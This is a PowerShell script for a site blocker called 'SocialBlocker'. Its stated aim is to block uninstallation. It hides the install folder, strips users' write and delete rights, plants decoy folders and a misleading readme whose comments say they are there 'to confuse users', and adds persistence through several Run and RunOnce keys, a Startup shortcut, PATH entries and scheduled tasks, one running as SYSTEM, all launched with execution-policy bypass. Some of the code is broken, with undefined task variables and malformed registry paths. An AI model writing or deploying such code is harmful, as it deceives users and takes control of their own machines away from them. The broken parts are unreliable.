# SocialBlocker uninstall guard
# This script prevents easy uninstallation

$installDir = "C:\Program Files\SocialBlocker"

# Set permissions to prevent deletion
$acl = Get-Acl $installDir
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Users", "ReadAndExecute", "ContainerInherit", "ObjectInherit", "None", "Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path $installDir -AclObject $acl

# Hide the folder
attrib +h +s "$installDir"

# Set the folder as read-only
attrib +r "$installDir"

# Prevent users from modifying the folder properties
icacls "$installDir" /reset /T /Q
icacls "$installDir" /inheritance:r
icacls "$installDir" /grant:r "Users:(R)"
icacls "$installDir" /deny:r "Users:(WD,AD,WO)"

# Add a desktop shortcut that points to the install directory
$desktopPath = [Environment]::GetFolderPath("Desktop")
$shortcutPath = Join-Path $desktopPath "SocialBlocker.lnk"
if (-not (Test-Path $shortcutPath)) {
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = "$installDir"
    $shortcut.WorkingDirectory = "$installDir"
    $shortcut.Description = "SocialBlocker - Site Blocker"
    $shortcut.Save()
}

# Create a simple text file in the install directory to confuse users
$readmePath = Join-Path $installDir "readme.txt"
$readmeContent = "SocialBlocker Site Blocker`n`nThis folder contains system files. Do not modify or delete.`n`nVersion: 1.0`nDate: $(Get-Date -Format 'yyyy-MM-dd')"
$readmeContent | Out-File $readmePath -Force

# Set the text file as read-only
attrib +r "$readmePath"

# Create a folder with a similar name to confuse users
$confuseDir = "C:\Program Files\SociaBlocker"
if (-not (Test-Path $confuseDir)) {
    New-Item -ItemType Directory -Path $confuseDir | Out-Null
    $confuseReadme = Join-Path $confuseDir "readme.txt"
    "SocialBlocker Site Blocker`n`nThis is a different folder. Do not confuse with the main installation." | Out-File $confuseReadme -Force
}

# Add registry entries to make it harder to find
$regPath1 = "HKCU\Software\SociaBlocker"
$regPath2 = "HKCU\Software\SocialBlocker"
$regValue = "C:\Program Files\SocialBlocker"

if (-not (Test-Path $regPath1)) {
    New-Item -Path $regPath1 -Force | Out-Null
    New-ItemProperty -Path $regPath1 -Name "InstallDir" -Value $regValue -Force | Out-Null
}

if (-not (Test-Path $regPath2)) {
    New-Item -Path $regPath2 -Force | Out-Null
    New-ItemProperty -Path $regPath2 -Name "InstallDir" -Value $regValue -Force | Out-Null
}

# Add startup entries in multiple locations
$runPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$runOncePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
$runServicesPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices"

$runValue = "powershell.exe -ExecutionPolicy Bypass -File `"$installDir\block_hosts.ps1`""

Set-ItemProperty -Path $runPath -Name "SocialBlockBlocker" -Value $runValue -Force
Set-ItemProperty -Path $runOncePath -Name "SocialBlocker" -Value $runValue -Force
Set-ItemProperty -Path $runServicesPath -Name "SocialBlocker" -Value $runValue -Force

# Add environment variable
$envPath = [Environment]::GetEnvironmentVariable("Path", "User")
if ($envPath -notlike "*$installDir*") {
    [Environment]::SetEnvironmentVariable("Path", "$envPath;$installDir", "User")
}

# Add more confusing registry entries
$regPath3 = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
$regPath4 = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
$regPath5 = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx"

if (-not (Test-Path $regPath3)) {
    New-Item -Path $regPath3 -Force | Out-Null
    New-ItemProperty -Path $regPath3 -Name "SocialBlocker" -Value $regValue -Force | Out-Null
}

if (-not (Test-Path $regPath4)) {
    New-Item -Path $regPath4 -Force | Out-Null
    New-ItemProperty -Path $regPath4 -Name "SocialBlocker" -Value $regValue -Force | Out-Null
}

if (-not (Test-Path $regPath5)) {
    New-Item -Path $regPath5 -Force | Out-Null
    New-ItemProperty -Path $regPath5 -Name "SocialBlocker" -Value $runValue -Force | Out-Null
}

# Add startup folder shortcut
$startupPath = [Environment]::GetFolderPath("Startup")
$startupShortcut = Join-Path $startupPath "SocialBlocker.lnk"
if (-not (Test-Path $startupShortcut)) {
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($startupShortcut)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$installDir\block_hosts.ps1`""
    $shortcut.Description = "SocialBlocker - Site Blocker"
    $shortcut.Save()
}

# Add more confusing folders
$confuseDir2 = "C:\Program Files\SociaBlocker2"
$confuseDir3 = "C:\Program Files\SocailBlocker"
if (-not (Test-Path $confuseDir2)) {
    New-Item -ItemType Directory -Path $confuseDir2 | Out-Null
}
if (-not (Test-Path $confuseDir3)) {
    New-Item -ItemType Directory -Path $confuseDir3 | Out-Null
}

# Add system environment variables
$systemPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
if ($systemPath -notlike "*$installDir*") {
    [Environment]::SetEnvironmentVariable("Path", "$systemPath;$installDir", "Machine")
}

# Add more registry confusion
$regPath6 = "HKLM\Software\SociaBlocker"
$regPath7 = "HKLM\Software\SocialBlocker"
$regPath8 = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"

if (-not (Test-Path $regPath6)) {
    New-Item -Path $regPath6 -Force | Out-Null
    New-ItemProperty -Path $regPath6 -Name "InstallDir" -Value $regValue -Force | Out-Null
}

if (-not (Test-Path $regPath7)) {
    New-Item -Path $regPath7 -Force | Out-Null
    New-ItemProperty -Path $regPath7 -Name "InstallDir" -Value $regValue -Force | Out-Null
}

if (-not (Test-Path $regPath8)) {
    New-Item -Path $regPath8 -Force | Out-Null
    New-ItemProperty -Path $regPath8 -Name "SocialBlocker" -Value $runValue -Force | Out-Null
}

# Add task scheduler entries for current user and system
$taskUser = "SocialBlockerUserTask"
$taskSystem = "SocialBlockerSystemTask"

if (-not (Get-ScheduledTask -TaskName $taskUser -ErrorAction SilentlyContinue)) {
    Register-ScheduledTask -TaskName $taskUser -Action $taskAction -Trigger $taskTrigger -Force
}

if (-not (Get-ScheduledTask -TaskName $taskSystem -ErrorAction SilentlyContinue)) {
    Register-ScheduledTask -TaskName $taskSystem -Action $taskAction -Trigger $taskTrigger -Force -User "SYSTEM"
}
